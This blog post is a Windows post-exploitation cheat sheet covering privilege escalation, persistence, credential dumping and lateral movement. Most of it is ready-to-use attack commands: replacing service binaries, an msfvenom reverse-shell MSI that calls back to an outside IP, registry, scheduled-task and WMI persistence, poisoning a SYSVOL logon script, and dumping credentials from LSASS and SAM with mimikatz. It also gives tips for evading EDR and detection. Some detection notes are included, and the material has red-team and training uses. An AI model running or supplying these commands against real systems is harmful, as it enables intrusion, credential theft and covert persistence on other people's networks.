---
title: 'Windows-Priv-Escalation_2.0'
author: Neo-Virex
date: 2025-08-16 08:00:00 +0000
categories: [Blog]
tags: [Privilege, Escalation]
render_with_liquid: false
media_subpath: /images/blogs/wpe/
image:
  path: room-img1.png
description: Windows privilege escalation (priv-esc) covers elevating a local account to Administrator/SYSTEM, and leveraging that foothold to gain higher privileges in Active Directory.
---

# Windows Privilege Escalation Techniques

Privilege escalation (priv-esc) means taking a normal user and raising it to Administrator or SYSTEM on a host, then pivoting to compromise higher roles in Active Directory. Attackers typically enumerate weak configs (permissions, auto-elevated binaries, Kerberos flaws) and exploit them with tools like **PrintSpoofer, JuicyPotato, Rubeus, Mimikatz**.  

Each technique is explained in four steps:  
1. **Discovery** – How to identify it  
2. **Condition** – What makes it exploitable  
3. **Exploitation** – Commands/payloads  
4. **Post-exploitation** – What to do next  

Defenders should note detection/mitigation. At the end you’ll find a **toolbox** (WinPEAS, BloodHound, scripts).

# 🪟 Local Privilege Escalation (User → SYSTEM)

Once you’ve compromised a Windows machine with a low-privileged user account, the next logical step is to escalate privileges to **SYSTEM**. SYSTEM is the most powerful account in Windows, equivalent to root in Linux.

## 🔍 Step 1: Identify Your Current Privileges

Always start by checking **who you are** and what groups/rights you have:

```cmd
whoami
whoami /priv
whoami /groups
```

Example output (low-privileged user):

```
nt authority\local service
```

Example output (SYSTEM):

```
nt authority\system
```

👉 If you see you’re only a regular user, you’ll need escalation.

---

## 📂 Step 2: Check Basic Enumeration

Use built-in commands to enumerate potential misconfigurations:

```cmd
systeminfo
net user
net localgroup administrators
netstat -ano
tasklist /v
```

Useful PowerShell enumeration:

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-Process | Select-Object Name, Id, Path
```

---

## ⚡ Step 3: Service Exploitation (Weak Service Permissions)

One of the most common privilege escalation vectors is **misconfigured services**. Look for services you can modify:

```cmd
sc query
sc qc <service_name>
```

Check file permissions on binaries:

```cmd
icacls "C:\Program Files\ServiceFolder\service.exe"
```

If `BUILTIN\Users:(M)` (modify) is allowed, you can replace the binary with your own malicious executable and restart the service:

```cmd
sc stop vulnerable_service
copy C:\Users\lowuser\evil.exe "C:\Program Files\ServiceFolder\service.exe"
sc start vulnerable_service
```

This gives you a SYSTEM shell.

---

## 📦 Step 4: Unquoted Service Paths

Check for **unquoted service paths**:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```

Example vulnerable path:

```
C:\Program Files\My App\bin\service.exe
```

If the service runs as SYSTEM and the path has no quotes, you can drop a malicious binary in:

```
C:\Program.exe
```

When the service starts, Windows executes your binary first, giving you SYSTEM.

---

## 🪟 Step 5: AlwaysInstallElevated Trick

Windows has an MSI installer policy called **AlwaysInstallElevated**. If enabled, any user can run MSI installers with SYSTEM privileges.

Check the registry:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`, you can exploit it:

1. Create a SYSTEM backdoor MSI with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f msi > exploit.msi
```

2. Execute as a low user:

```cmd
msiexec /quiet /qn /i exploit.msi
```

💥 Boom! SYSTEM shell.

---

## 🔑 Step 6: Weak Registry Permissions

Some services store configs in the registry. If registry keys are writable, you can hijack the executable path.

Check permissions:

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnService
```

Modify path if writable:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\lowuser\evil.exe" /f
```

Restart service:

```cmd
sc stop VulnService
sc start VulnService
```

Now your payload runs as SYSTEM.

---

## 📡 Step 7: Exploiting Scheduled Tasks

List tasks:

```cmd
schtasks /query /fo LIST /v
```

Look for:

* SYSTEM-run tasks
* Writable paths in “Task to Run”

If writable, replace binary and wait for execution. For manual trigger:

```cmd
schtasks /run /tn "TaskName"
```

---

## 🔥 Step 8: Kernel & Exploit DB

Sometimes, you can’t find misconfigs. In that case, check for Windows kernel exploits.

1. Find OS version:

```cmd
systeminfo
```

2. Run `windows-exploit-suggester` or `wesng` locally:

```bash
wes.py --update
wes.py systeminfo.txt
```

3. Search and exploit with Metasploit or manual payloads.

---

## 🧩 Example: Potato Family Exploits

Windows services like **SeImpersonatePrivilege** allow SYSTEM escalation. Check privileges:

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is enabled, use tools like **JuicyPotato**, **PrintSpoofer**, or **RoguePotato**:

```cmd
PrintSpoofer64.exe -c "cmd.exe"
```

This spawns SYSTEM.

---

## ✅ Summary of Techniques

* Service misconfigurations (weak perms, unquoted paths, registry hijacking)
* AlwaysInstallElevated policy abuse
* Scheduled tasks manipulation
* Kernel exploits (EoP)
* Token impersonation (Potato family)

If successful, confirm escalation:

```cmd
whoami
```
---


---

# 🔒 Persistence

Persistence refers to **methods used to survive system reboots, logouts, or privilege changes** so that access can be maintained without needing to re-exploit the target.

In a Windows environment, persistence can be established at different levels:

---

## 1. Startup Folder Persistence

Anything placed in the user’s or system’s **Startup folder** executes when Windows starts.

### 📂 Path

* **User Startup Folder**:

  ```
  C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  ```
* **All Users Startup Folder**:

  ```
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  ```

### 🛠️ Example

```cmd
copy backdoor.exe "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
```

On reboot or login, `evil.exe` will auto-execute.

---

## 2. Registry Run Keys

Programs listed in specific registry keys will **run automatically on startup**.

### 📂 Common Keys

* For the current user:

  ```
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  ```
* For all users:

  ```
  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
  ```

### 🛠️ Example

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\Users\victim\evil.exe"
```

On reboot, `evil.exe` launches automatically.

---

## 3. Scheduled Tasks

Attackers can create **scheduled tasks** to run payloads periodically or at login.

### 🛠️ Example

```cmd
schtasks /create /tn "Updater" /tr "C:\evil.exe" /sc onlogon /ru SYSTEM
```

* `/tn` = Task name
* `/tr` = Target program
* `/sc onlogon` = Runs at logon
* `/ru SYSTEM` = Runs as SYSTEM

---

## 4. Windows Services

Attackers may create or modify **Windows services** to execute payloads.

### 🛠️ Example

```cmd
sc create EvilService binPath= "C:\evil.exe" start= auto
sc start EvilService
```

* `start= auto` → service runs automatically on boot.

Alternatively, hijacking an existing service’s `binPath` is also common.

---

## 5. DLL Hijacking

If a program loads DLLs insecurely, attackers can place a **malicious DLL** in the same folder.
On program execution, the malicious DLL loads instead of the legitimate one.

### 🛠️ Example Steps

1. Identify vulnerable application.
2. Craft malicious DLL (`evil.dll`).
3. Place it in the same directory as the executable.
4. When the app runs → malicious DLL is loaded.

---

## 6. WMI Event Subscriptions

Windows Management Instrumentation (WMI) allows **event-driven persistence**.

### 🛠️ Example (PowerShell)

```powershell
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
  Name='EvilFilter'; EventNamespace='root\cimv2';
  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
  Name='EvilConsumer'; CommandLineTemplate="C:\evil.exe"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
  Filter=$filter; Consumer=$consumer
}
```

This executes `evil.exe` when system time hits noon.

---

## 7. GPO / Logon Scripts

On domain environments, attackers can abuse **Group Policy Objects** or logon scripts to push persistence.

### Example: Logon Script

```cmd
echo C:\evil.exe >> \\DOMAIN\SYSVOL\domain.local\scripts\logon.bat
```

All users running the logon script will execute `evil.exe`.

---

## 8. Bootkits & Rootkits (Advanced)

These persist at the **bootloader or kernel level**.

* Modify `MBR` or `UEFI` boot components.
* Harder to detect, survives reinstalls.
  ⚠️ Typically beyond CTF scope but relevant for red team operations.

---

## 🔍 Detection & Defense

* Monitor `Run` keys, startup folders, scheduled tasks, services.
* Use Sysinternals tools like `autoruns.exe`.
* Regularly inspect WMI subscriptions:

  ```powershell
  Get-WmiObject -Namespace root\subscription -Class __EventFilter
  ```
* EDR/AV solutions may detect persistence attempts.

---

---

## 🔑 Credential Dumping (SAM, LSASS, NTLM Hashes, etc.)

Credential dumping is the process of extracting authentication material (passwords, hashes, PINs, Kerberos tickets, etc.) from Windows systems. This step is often critical after privilege escalation to **move laterally**, **maintain persistence**, or **escalate further**.

---

### 📂 1. Dumping SAM & SYSTEM Hives (Registry)

The **Security Accounts Manager (SAM)** database stores local user password hashes. Combined with the **SYSTEM** hive (used to decrypt them), an attacker can extract NTLM hashes.

```powershell
# Export SAM & SYSTEM registry hives
reg save hklm\sam C:\temp\sam.save
reg save hklm\system C:\temp\system.save
```

Tools like `secretsdump.py` (Impacket) can parse these:

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

### 🧠 2. Dumping LSASS Process Memory

The **Local Security Authority Subsystem Service (LSASS.exe)** holds plaintext creds, NTLM hashes, and Kerberos tickets in memory.

* **With Mimikatz (classic)**:

```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

* **With ProcDump (stealthier)**:

```cmd
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

Then parse the dump offline:

```bash
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

### 🎭 3. DCSync (No LSASS Dumping Needed)

If you have **Domain Admin or DC replication rights**, you can pull NTLM hashes directly from the Domain Controller using **DCSync**.

```cmd
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

This avoids touching LSASS and is stealthier.

---

### 🪙 4. DPAPI Credential Dumping

Windows uses **DPAPI** to protect saved credentials (e.g., Chrome passwords, RDP creds).

```cmd
mimikatz # dpapi::cred /in:C:\Users\User\AppData\Roaming\Microsoft\Credentials\<file>
```

---

### 🔎 5. Popular Tools for Credential Dumping

* **Mimikatz** → LSASS, SAM, Kerberos tickets
* **Impacket (secretsdump.py)** → SAM hashes, NTDS.dit extraction
* **LaZagne** → Dumps creds from browsers, mail, WiFi, RDP, etc.
* **SharpDump / SafetyKatz** → C# alternatives, more OPSEC-friendly

---

### ⚠️ OPSEC Notes

* Dumping LSASS may trigger EDR/AV → use `comsvcs.dll` or **NanoDump** instead.
* DCSync is often monitored → use cautiously.
* Always consider **offline parsing** to reduce detection risk.

---


### 🔍 Credential Dumping (Extended: Detection & Evasion)

Before jumping straight into **Lateral Movement**, it’s worth expanding on **Credential Dumping** because this phase is both **critical and noisy** — attackers almost always dump creds, and defenders heavily monitor it.

If you skip deeper coverage here, you’ll miss key **detection artifacts** and **evasion methods** that adversaries actually use in the wild.

#### ✅ Why expand more on Credential Dumping first?

* **Detection**: SOC teams monitor for LSASS access, registry hives exports, and abnormal process injections.
* **Evasion**: Attackers often use minidumps, direct system calls, or memory cloning to bypass AV/EDR.
* **Relevance**: The way you dump creds directly impacts whether your **Lateral Movement** will succeed quietly.

#### 🚩 Suggested Flow:

1. **Credential Dumping – Basics (you already covered)**

   * NTLM hashes, SAM database, LSASS memory.

2. **Credential Dumping – Detection Techniques**

   * Sysmon Event ID 10 (process access to LSASS).
   * Security logs showing `ntds.dit` access.
   * Unusual `reg save` or `vssadmin` activity.
   * EDR flagging Mimikatz signatures.

3. **Credential Dumping – Evasion Techniques**

   * Using **MiniDumpWriteDump** with renamed tools.
   * **Direct Syscalls** to bypass hooked Windows APIs.
   * Leveraging **comsvcs.dll** instead of known tools.
   * Using **ProcDump** with renamed binaries.
   * Abusing **LSA secrets** via registry instead of LSASS memory.

4. **Credential Dumping – Hands-on Detection & Bypass Lab (Optional)**

   * Show a **normal Mimikatz dump** (gets caught).
   * Show a **stealthier LSASS dump** (via syscalls / procdump).
   * Compare logs and defender visibility.

👉 After that, transition smoothly into **Lateral Movement**, because now you’ll have:

* NTLM hashes → Pass-the-Hash
* Cleartext creds → RDP, WMI, PS Remoting
* Tickets → Pass-the-Ticket (Kerberos)

---

## 🔀 Lateral Movement Techniques

### 1. **Pass-the-Hash (PtH)**

* **What**: Reuses stolen NTLM hash instead of plaintext password.
* **Tools**: `mimikatz`, `crackmapexec`, `impacket-psexec`, `wmiexec.py`
* **Target**: Windows hosts with SMB, RDP, or WinRM.
* **Detection**:

  * Event ID **4624** (Logon Type 3: Network) with NTLM.
  * Multiple logins across different hosts using the same hash.
* **Evasion**:

  * Blend in with normal admin activity.
  * Use stolen **Kerberos tickets** instead (see PtT below).

---

### 2. **Pass-the-Ticket (PtT)**

* **What**: Use stolen Kerberos TGT or service tickets to authenticate.
* **Tools**: `mimikatz`, `Rubeus`, `impacket-smbexec`
* **Target**: Active Directory environments.
* **Detection**:

  * Event ID **4769** (Kerberos service ticket request).
  * Tickets with **unusual lifetimes** or generated off-hours.
* **Evasion**:

  * Golden Ticket (custom forged TGT with KRBTGT hash).
  * Silver Ticket (forged service tickets).

---

### 3. **Remote Desktop Protocol (RDP) Hijacking**

* **What**: Reuse credentials to log into remote hosts.
* **Tools**: Native `mstsc`, `rdesktop`, or automated via `crackmapexec`.
* **Detection**:

  * Event ID **4624** (Logon Type 10: RemoteInteractive).
  * Multiple failed RDP attempts.
* **Evasion**:

  * Tunnel RDP traffic over another protocol (SSH, HTTPS).
  * Use `tscon.exe` to hijack existing RDP sessions without login events.

---

### 4. **Windows Management Instrumentation (WMI)**

* **What**: Remote command execution via WMI.
* **Tools**: `wmiexec.py` (Impacket), PowerShell `Invoke-WMIExec`.
* **Detection**:

  * Event ID **4688** (Process Creation).
  * WMI Event subscription logs (`Microsoft-Windows-WMI-Activity/Operational`).
* **Evasion**:

  * Encode commands in PowerShell.
  * Use “living-off-the-land” (LOLBins).

---

### 5. **PsExec (SMB)**

* **What**: Remote service creation & execution.
* **Tools**: Sysinternals `PsExec.exe`, `impacket-psexec`.
* **Detection**:

  * Event ID **7045** (Service creation).
  * Event ID **4688** for PsExec commands.
* **Evasion**:

  * Rename PsExec binary to mimic legitimate software.
  * Clean up services after execution.

---

### 6. **WinRM (Windows Remote Management)**

* **What**: Remote PowerShell execution if WinRM enabled.
* **Tools**: `evil-winrm`, PowerShell remoting.
* **Detection**:

  * Event ID **4688** (PowerShell execution).
  * Event ID **4624** with Logon Type 3 (network).
* **Evasion**:

  * Use encrypted channels.
  * Blend with legitimate admin PowerShell sessions.

---

### 7. **DCSync**

* **What**: Requesting replication from a Domain Controller to dump credentials.
* **Tools**: `mimikatz lsadump::dcsync`, `secretsdump.py` (Impacket).
* **Detection**:

  * Event ID **4662** with `Replicating Directory Changes` permission.
* **Evasion**:

  * Use stealth accounts with DC replication rights.
  * Golden Ticket + DCSync combo.

---

### 8. **Remote Scheduled Tasks**

* **What**: Creating scheduled tasks remotely for execution.
* **Tools**: `schtasks.exe /S`, PowerShell `Register-ScheduledTask`.
* **Detection**:

  * Event ID **4698** (Task creation).
  * Sysmon Event ID **1** (Process creation).
* **Evasion**:

  * Name task similar to legitimate system tasks.
  * Delete task after execution.

---

### 9. **SMB/Network Shares**

* **What**: Dropping payloads on shared drives and executing remotely.
* **Detection**:

  * File access logs (Event ID **5140**).
  * Multiple unusual file copies to admin shares (`C$`, `ADMIN$`).
* **Evasion**:

  * Blend in with regular file operations.
  * Use timestamp spoofing.

---

### 10. **Kerberoasting**

* **What**: Requesting service tickets for SPNs, then cracking offline.
* **Tools**: `Rubeus`, `impacket-GetUserSPNs`.
* **Detection**:

  * Event ID **4769** with RC4 encryption type.
* **Evasion**:

  * Limit requests to high-value accounts.
  * Spread requests over time.

---

📌 **Key Insight**:
Defenders often focus on **PsExec and RDP** detection, but advanced attackers prefer **WMI, WinRM, and Kerberos abuse** because they blend into admin behavior.

---
---

🔀 Lateral Movement Techniques (Summary)

Pass-the-Hash (PtH) – Reuse NTLM hashes for authentication.

Pass-the-Ticket (PtT) – Reuse stolen Kerberos tickets (TGT/Silver/Golden).

RDP Hijacking – Use credentials to log into remote hosts, including session hijacking.

WMI Execution – Remote command execution via Windows Management Instrumentation.

PsExec – Remote service creation & execution via SMB.

WinRM – PowerShell remoting for remote execution.

DCSync – Replicate credentials from Domain Controllers.

Remote Scheduled Tasks – Remotely create tasks for code execution.

SMB/Network Shares – Drop payloads on shares and execute remotely.

Kerberoasting – Request service tickets for SPNs and crack offline.

Key Tip: Advanced attackers favor WMI, WinRM, Kerberos attacks because they blend with normal admin activity and leave fewer logs.

---